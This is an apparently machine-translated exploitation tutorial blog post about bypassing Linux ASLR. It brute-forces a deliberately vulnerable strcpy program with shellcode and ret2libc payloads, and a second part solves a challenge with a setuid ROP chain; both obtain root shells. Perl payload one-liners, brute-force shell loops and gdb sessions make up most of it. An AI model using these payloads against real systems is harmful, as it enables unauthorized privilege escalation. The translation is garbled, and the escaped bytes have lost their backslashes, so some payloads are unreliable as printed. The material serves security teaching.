---
layout: blog-detail
comments: true
title: "ASLR: Being a postman in the city where they change the street names"
date: 2018-08-17T10:14:00+00:00
categories:
    - Exploiting
tags:
    - 32 bit
    - ASLR
    - ASLR bypass
    - buffer overflow
    - buffer overrun
    - bypass
    - exploit
    - exploiting
    - gadget
    - linux
    - overflow
    - overrun
    - re2lib
    - ret2libc
    - ropgadget
    - shellcode
    - stack
    - stack based
    - stack overflow
    - x86
image_src: /assets/uploads/2018/08/PuffinSecurity-ASLR-Ser-cartero-en-la-ciudad-donde-cambian-los-nombres-de-las-calles-exploiting.jpg
image_height: 1280
image_width: 1920
author: Yago Gutierrez
description: This beautiful morning (I do not know what time you will read this) we will see in more depth the ASLR. ASLR (not ASMR) attends the words Address Space Layout Randomization. Is a technique that was designed at the beginning of the century with DEP/NX/W^X/...
publish_time: 2018-08-17T10:14:00+00:00
modified_time: 2019-10-09T15:18:46+00:00
comments_value: 0
---
This beautiful morning (I do not know what time you will read this) we will see in more depth the ASLR.

ASLR (not ASMR) attends the words _Address Space Layout Randomization_. Is a technique that was designed at the beginning of the century with DEP/NX/W^X/ etc whose aim was to avoid the determinism of the addresses in the stack, so that an attacker who, in his laboratory replicated in all aspects possible attacked the system remains unable to predict in which direction the libraries are loaded, or the stack will be located, or if there is fortune and binary foot, where the binary will be charged. Clearly this is a great difficulty to know how the raffle, but that they are easy to check if a system has enabled ASLR

`$ sysctl kernel.randomize_va_space  
kernel.randomize_va_space = 2`

If I had a value `0`, the ASLR will be disabled. In this case the level is `2`, ie ([… / sysctl / kernel.txt](https://www.kernel.org/doc/Documentation/sysctl/kernel.txt)) Addresses are randomized, in addition to those randomized to the level `1`: reserved with `mmap()`, the stack, and although we are less interested because we do not yet see the faces with the kernel, addresses vDSO ([interesting](https://v0ids3curity.blogspot.com/2014/12/return-to-vdso-using-elf-auxiliary.html)). Considering that used `mmap()` to load the libraries and binary, this means that the base addresses of all these components. Until now, it have not worked with binary PIE, in a system with ASLR allow this use to be randomized just a ret2plt perhaps some simple ret2syscall, but that would only for execve() (which can serve a privesc or remote where the program exploited has redirected the `stdin` and `stdout` to the socket with the connection used by the attacker, which is very rare, but rare programs are everywhere. I remember something made programs Exploit Exercises Fusion machine). If the binary is large, are more likely to find what we need, one small everything is more difficult. But nevertheless, if we are facing a binary PIE things darken even further, and it becomes an obligation solve this problem head. It can be achieved in two ways: (vulgar, but always present) by brute force, or (smart) taking advantage of a memory leak.

An entry for memory leaks already appear here, here we see the controlled application (as contradictory as it sounds) of brute force.

ASLR studies how it works internally. We distinguish three areas of the process: binary, libraries and / or other areas reserved for mmap(), and the stack. Each of these areas has a variable assigned on the structure of the process, these being `delta_exec`, `delta_mmap` and `delta_stack`. To load the program, the system places in these variables partially random values ​​in the first two values, 16 bits are randomized, and at last, the stack 24 bits. These values ​​are added to each predefined base address to give an unpredictable movement of said segments in the virtual address space process. Let’s study the position in the memory of any variable stack in successive runs on the same system being activated by ASLR

    $ cat aslr.c 
    #include <stdio.h>

int main()  
{  
int a;  
printf(“%pn”, &a);  
return 0;  
}

$ gcc aslr.c -o aslr -m32

$ ./aslr  
0xffb8d8fc

$ ./aslr  
0xffef559c

$ ./aslr  
0xffbd3c2c

$ ./aslr  
0xffbd3a7c

$ ./aslr  
0xff899b3c

$ ./aslr  
0xffa6e9bc

$ ./aslr  
0xffc9380c

$ ./aslr  
0xfff70c9c

$ ./aslr  
0xffcf919c

$ ./aslr  
0xffda035c

$ ./aslr  
0xff82c1ac

$ ./aslr  
0xffc04b8c

$ ./aslr  
0xffdcc92c

$ ./aslr  
0xffc034bc

According, we see that vary 3 bytes of the 4 forming direction, ie in principle 24 bits.

0xffda035c = 11111111 **1**1011010 00000011 01011100
0xffdcc92c = 11111111 **1**1011100 11001001 00101100
0xffb8d8fc = 11111111 **1**0111000 11011000 11111100
0xffc9380c = 11111111 **1**1001001 00111000 00001100
0xffc04b8c = 11111111 **1**1000000 01001011 10001100

We see that the first bit of the second byte of each address matches. In the byte minor also they match two bits, but because it is an offset. We can deduce that only 23 bits are scrambled, not 24. However, the offset we are also interested because several bits coincide quite frequently. We must add that the stack must be aligned with 0x10, so the possible places to find the stack are further reduced. All these factors increase the likelihood that the launch a brute force attack against a particular direction, is obtained.  
Let’s recover an old friend  

    #include <stdio.h>
    #include <string.h>

void imprimir(char\* arg)  
{  
char buf\[128\];  
strcpy(buf, arg);  
printf(“%sn”, buf);  
}

int main(int argc, char\*\* argv)  
{  
if(argc < 2) return 1;  
imprimir(argv\[1\]);  
return 0;  
}

Compiled with NX disabled and `ltrace` we get with the direction of that moment of `buf`.  
`$ gcc vuln.c -o vuln -m32 -z execstack`

$ ltrace ./vuln \`cat sc.o“perl -e ‘print “A”x(140-31) . “xaaxaaxaaxff”‘\`  
\_\_libc\_start\_main(0x56601602, 2, 0xffa4cb84, 0x56601650 <unfinished …>  
strcpy(0xffa4ca30, “130013333152001300Ph//shh/bin211343PS2113411322260v315200A”…) = 0xffa4ca30  
puts(\[…\]) = 145  
— SIGSEGV (Segmentation fault) —  
+++ killed by SIGSEGV +++  
Then a valid address for our `buf` is `0xffa4ca30`. A nopsled could make things pretty, and even more if you were in a variable environment. But let’s first try using only our small buffer.  

    #!/bin/sh
    i=0
    while :
    do
        echo "Intento: $i"
        ./vuln `cat sc.o``perl -e 'print "A"x(140-31) . "x30xcaxa4xff"'`
        i=$((i+1))
    done

Run it, and wait  
I just came back (as I was taking), and has already finished brute force, trying 472,449 (more than previous executions, as I have tried several scripts to see which was the fastest and practical, so we should add a few more attempts).

    $ ./aslr.sh
    Intento: 0
    1�1�̀1�Ph//shh/bin��PS��1Ұ
                             AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0ʤ�
    Segmentation fault (core dumped)
    Intento: 1
    1�1�̀1�Ph//shh/bin��PS��1Ұ
                             AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0ʤ�
    Segmentation fault (core dumped)
       .
       .
       .
    Intento: 472446
    1�1�̀1�Ph//shh/bin��PS��1Ұ
                             AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0ʤ�
    Segmentation fault (core dumped)
    Intento: 472447
    1�1�̀1�Ph//shh/bin��PS��1Ұ
                             AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0ʤ�
    Segmentation fault (core dumped)
    Intento: 472448
    1�1�̀1�Ph//shh/bin��PS��1Ұ
                             AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0ʤ�
    $ 

\[Sorry for forgetting to do setuid: /\] As I was not here when the wonderful event happened. I cannot say how long it took. Obviously, this is fate, it is the grace to do a brute force, just run it again to calculate how fast attempts were made and has succeeded in 1487. Blackngel succeeded in the attempt number 22, by doing so in an variable environment, which could employ a large size. Let’s to try a setuid, to see how it would.  

    Intento: 23122
    1�1�̀1�Ph//shh/bin��PS��1Ұ
                             AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0ʤ�
    # whoami
    root
    # 

In short, it is a matter of “luck” that has taken so long before and now not even a minute late … (also now more agile and makes your computer much faster attempts).  
We got bypassear ASLR, taking advantage of the process does not have NX. To avoid NX should make a ROP, as we have seen. The problem is that in the ROP more factors come into play, but also obviously depends on how you do the ROP. A ROP which was localized in segments where a different `delta` variable is used addresses, decreases the likelihood of success. A ROP where address stack, a library is used (or several, since all libraries are loaded with `mmap()`, so that all share `delta_mmap`) and binary requires an execution converge the three variables, `delta_stack` , `delta_mmap` and `delta_exec`, which is highly unlikely.  
However, it only addresses using the library, can be achieved success, and indeed more likely than a stack, since the stack has a randomizing factor 24, and 16 libraries. Let us see

    $ ldd vuln
     linux-gate.so.1 (0xf77ba000)
     libc.so.6 => /lib32/libc.so.6 (0xf75e0000)
     /lib/ld-linux.so.2 (0xf77bc000)

We have obtained a base address of each valid library, now use it to get directions from `system()` and `/bin/sh` in the libc  
`$ python2 ROPgadget/ROPgadget.py --binary /lib32/libc.so.6 --string /bin/sh --offset 0xf75e0000  
Strings information  
============================================================  
0xf773ccc8 : /bin/sh`

    $ readelf /lib32/libc.so.6 -a | grep system
       246: 00113c60    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
       628: 0003a850    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
      1461: 0003a850    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0

`0x0003a850 + 0xf75e0000 = 0xf761a850`  
Perfect. The exploitation cannot be easier. The reward comes in a second  
``$ cat aslr.sh  
#!/bin/sh  
i=0  
while :  
do  
echo "Intento: $i"  
./vuln `perl -e 'print "A"x140 . "x50xa8x61xf7" . "xaaxaaxaaxaa" . "xc8xccx73xf7"'`  
i=$((i+1))  
done``

$ ./aslr.sh  
Intento: 0  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�a�������s�  
Segmentation fault  
Intento: 1  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�a�������s�  
Segmentation fault  
.  
.  
.  
Intento: 195  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�a�������s�  
Segmentation fault  
Intento: 196  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�a�������s�  
Segmentation fault  
Intento: 197  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�a�������s�  
Illegal instruction  
Intento: 198  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�a�������s�  
\# whoami  
root  
#  
After closing the shell program breaks because we have not bothered to place the direction of `exit()` as `ret` course for `system()`  
`# exit  
Segmentation fault  
Intento: 199  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�a�������s�  
Segmentation fault  
[...]`  
It continues the script by brute force. In fact it’s funny that after the `exit` command, it obtain a root again in less than a second  
`Intento: 746  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�a�������s�  
Segmentation fault  
Intento: 747  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�a�������s�  
#`  
We have achieved a privilege elevation bypasseando ASLR and NX by an ROP that simple.

Clearly such a large number of executions can easily jump any alarm, and indeed should not be very advisable to do so. Of course, there may be some mechanism that prevents a program a number of times to run in a very short period of time … The “right” way to evade ASLR is through a memory leak (“correct” in the sense that it is safer, because in this “right” case is any technique that leads to success, but the exploiting is not real life … or yes?)

In a remote exploit this does not work as a server can make a `fork()` to handle each request received. `fork()` creates a process just like the parent, this does not change the variables `delta_*` (is an exact copy of the parent process), so that different requests will be handled by processes with the same virtual addresses, which prevents us from doing strength gross, since grace of brute force is varying directions. Brute force could be made to different instances of the entire server, it would be necessary to kill the father (may suffice SIGSEGV) and that the system existed a service charge restart the server if this die, thus itself would vary addresses and could make our attack in this way. This feature prevents us now from brute force.

We have seen that, although unwise, brute force is always an option. See you in the next post, greetings.

makes a pair of posts proposed a challenge in which we meet an old friend:  

    #include <stdio.h>
    #include <string.h>

void print(char\* arg)  
{  
char buf\[128\];  
strcpy(buf, arg);  
printf(“%sn”, buf);  
}

int main(int argc, char\*\* argv)  
{  
if(argc < 2) return 1;  
print(argv\[1\]);  
return 0;  
}

This time we asked to solve an original differently than those already given in another post (a between the post and another in solutionary). Let’s my solution scheme.

high addresses
+-------------------+
|    0x00000000     | We will take advantage of a 0x00000000 that is lost in the stack
+-------------------+
|    &leave;ret     |
+-------------------+
|     &setuid()     |
+-------------------+
|       &ret        |
+-------------------+
|                   |
          .
          .
|                   |
+-------------------+
|       &ret        |
+-------------------+
|       &ret        | EIP(s)
+-------------------+
|     &buf - 4      | EBP(s) Here we put a fail EBP fake
+-------------------+ <- EBP (initially)
|        ...        | (?? bytes, gcc hitngs, always leaves things aroung) Refill
+-------------------+ <- End buf
|        ...        | Refill (116 bytes)
+-------------------+
|    &"/bin/sh"     |
+-------------------+
|      &exit()      |
+-------------------+
|     &system()     |
+-------------------+ <- buf (128 bytes)
|        ...        |
+-------------------+ <- ESP (initially)
  low addresses

Once we have made an outline of the process of exploitation going to use, we had our _perl one-line_ (and, I know that many people would use python, which would be clearer, but Blackngel has struck me in this, plus if we do it in python, would have to write more than a _one-line_, I remember CLS @pastaCLS baptized me as “the perl _one-liner_“).

Well, one way to calculate the filling must introduce without `create_pattern` Metasploit and other tools is seeing the code in asm, noticing how specifically referenced the buffer:  
`804844a: 8d 85 78 ff ff ff lea eax,[ebp-0x88]  
8048450: 50 push eax  
8048451: e8 aa fe ff ff call 8048300 <strcpy@plt>`  
Therefore, buf is 0x88 (136 dec) bytes under `EBP(s)`. So first we introduce the address &system, &exit, &”/bin/sh” plus a fill of 124 bytes.  

    0xf7f5ecc8 : /bin/sh (ROPgadget)
    0xf7e3c850 <system> (gdb)
    0xf7e30800 <exit> -> nope (byte 0x00 and earlier dirs do not serve) -> 0xf7eb35c5 <_exit> (gdb)
    0xf7eb3d60 <setuid> (gdb)
    8048527: c3 ret    (objdump)

804846c: c9 leave  
804846d: c3 ret (objdump)

We can already do most of the exploit, the first thing we are placing the directions that we will introduce at least (probably have to enter several `&ret`‘s to reach `0x00000000` remaining as an argument to setuid(), but for now we will place only one `&ret`)  
`perl -e 'print "x50xc8xe3xf7" . "xc5x35xebxf7" . "xc8xecxf5xf7" . "A"x124 . "xaaxaaxffxff" . "x27x85x04x08" . "x60x3dxebxf7" . "x6cx84x04x08"'`

Now let’s check the stack looking for a close NULL  
``$ gdb -q vuln  
Reading symbols from vuln...(no debugging symbols found)...done.  
(gdb) disas imprimir  
Dump of assembler code for function imprimir:  
0x0804843b <+0>: push %ebp  
0x0804843c <+1>: mov %esp,%ebp  
0x0804843e <+3>: sub $0x88,%esp  
0x08048444 <+9>: sub $0x8,%esp  
0x08048447 <+12>: pushl 0x8(%ebp)  
0x0804844a <+15>: lea -0x88(%ebp),%eax  
0x08048450 <+21>: push %eax  
0x08048451 <+22>: call 0x8048300 <strcpy@plt>  
0x08048456 <+27>: add $0x10,%esp  
0x08048459 <+30>: sub $0xc,%esp  
0x0804845c <+33>: lea -0x88(%ebp),%eax  
0x08048462 <+39>: push %eax  
0x08048463 <+40>: call 0x8048310 <puts@plt>  
0x08048468 <+45>: add $0x10,%esp  
0x0804846b <+48>: nop  
0x0804846c <+49>: leave  
0x0804846d <+50>: ret  
End of assembler dump.  
(gdb) br *print +50  
Breakpoint 1 at 0x804846d  
(gdb) run "`perl -e 'print "x50xc8xe3xf7" . "xc5x35xebxf7" . "xc8xecxf5xf7" . "A"x124 . "xaaxaaxffxff" . "x27x85x04x08" . "x60x3dxebxf7" . "x6cx84x04x08"'`"  
Starting program: /home/arget/vuln "`perl -e 'print "x50xc8xe3xf7" . "xc5x35xebxf7" . "xc8xecxf5xf7" . "A"x124 . "xaaxaaxffxff" . "x27x85x04x08" . "x60x3dxebxf7" . "x6cx84x04x08"'`"  
[...]AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]``

Breakpoint 1, 0x0804846d in print ()  
(gdb) x $esp  
0xffffd2ac: 0x08048527 # &ret  
(gdb)  
0xffffd2b0: 0xf7eb3d60 # &setuid()  
(gdb)  
0xffffd2b4: 0x0804846c # &leave;ret  
(gdb)  
0xffffd2b8: 0xffffd300  
(gdb)  
0xffffd2bc: 0x080484d1  
(gdb)  
0xffffd2c0: 0xf7fb53dc  
(gdb)  
0xffffd2c4: 0xffffd2e0  
(gdb)  
0xffffd2c8: 0x00000000  
(gdb)  
(In the output of the delete program bytes unprintable, because he has already given me some a headache from deformating the text in the post, as some may indicate a vertical tab, page break or similar things marring design blog). We find a NULL 5 above positions, so that we will introduce 4 more ret’s.  
`perl -e 'print "x50xc8xe3xf7" . "xc5x35xebxf7" . "xc8xecxf5xf7" . "A"x124 . "xaaxaaxffxff" . "x27x85x04x08"x5 . "x60x3dxebxf7" . "x6cx84x04x08"'`  
The operation will occur as follows:  
– The `leave` print() collects in the EBP a false frame pointing four bytes under the beginning of our buffer (where we put our ROP `system("/bin/sh") + exit()`) .  
– The `ret` print() contains one address to another `ret` instruction, which in turn collect `ret` another direction, is simply a way to get where we arrive at two positions after 0x00000000 (have to be two positions for setuid () recognizes the 0x00000000 as an argument). It would also use a gadget pop,pop,pop,pop;ret and place stuffing, but I preferred this, which does not modify the registers.  
– The last `ret` collect &setuid, which recognizes as an argument the two positions 0x00000000 beyond because it believes that the function has been called a `call`.  
– setuid() ends and executes a `ret` where should be the `EIP(s)`, which collects in EIP address of a `leave;ret`, the `leave` the first move of EBP to ESP the buf-4 direction, to subsequently make a `pop ebp` to collect trash in the EBP and increase the ESP in 4 bytes, pointing at the beginning of buf. Finally, the `ret` instruction buf collect the start address & classic system ushering ROP.  
We will find the address buf and run it.

    [unset environment LINES y COLUMNS]
    Breakpoint 2, 0x08048456 in print ()
    (gdb) x $esp
    0xffffd210: 0xffffd220

``$ /home/arget/vuln "`perl -e 'print "x50xc8xe3xf7" . "xc5x35xebxf7" . "xc8xecxf5xf7" . "A"x124 . "x1cxd2xffxff" . "x27x85x04x08"x5 . "x60x3dxebxf7" . "x6cx84x04x08"'`"  
[...]AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]  
# whoami  
root  
#``  
Exploited.  
This little program will last us for a while. How many different ways can exploit a program?  
Regards.

At Puffin Security, we use the ELITE SECURITY TESTING CONSULTING methodology so you can rest assured that your organization will have the highest level of cloud security. 

Complete the form, and we'll be in touch as soon as possible

[![Lets Audit Button](/assets/uploads/2023/01/Puffin-security-blog-button-lest-audit-2.jpg 'lets Audit Button')](https://hub.puffinsecurity.com/quote)
